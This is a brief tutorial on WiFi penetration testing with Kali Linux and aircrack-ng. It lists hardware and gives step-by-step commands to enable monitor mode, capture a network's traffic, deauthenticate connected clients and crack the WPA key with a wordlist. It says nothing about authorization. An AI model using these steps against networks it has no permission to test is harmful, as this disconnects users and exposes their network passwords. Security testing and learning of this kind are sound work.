Penetration Testing - WiFi

OS = Kali Linux Live Everything > You may download it from https://kali.org
Tools - aircrack-ng

Hardwares - Atheros 9721 or ALFA Model AWUS036NH
OR You may boot Kali Linux Live Everything by making a bootable USB using "RUFUS" and use your own laptop's network adapter (Important! It should support "Monitor Mode" otherwise it will not work)

Tool	Purpose	Example Command
airmon-ng	      Enable monitor mode	        sudo airmon-ng start wlan0
airodump-ng	    Capture network traffic	    sudo airodump-ng -c 6 wlan0mon
aireplay-ng	    Inject/deauth packets	      sudo aireplay-ng -0 1 ...
aircrack-ng	    Crack WPA/WEP keys	        sudo aircrack-ng -w wordlist.lst ...


Kali Linux Commands:

1. ifconfig to check network interfaces
2. iwconfig to check wireless interfaces
 By default the wireless interface is in MANAGED MODE. 
3. airmon-ng stop wlan0 (if the interface is wlan0)
4. airmon-ng start wlan0 ( from stopping to start I will be gone into monitoring mode)
5. airodump-ng --bssid <BSSID> --channel <CHANNEL> -w <ESSID> wlan0 (or if its wlan0mon)
6. Open another terminal or terminal tab and then enter the following command
7. aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0
8. aircrack-ng -w /path/to/wordlist.txt -b <BSSID> capture-01.cap
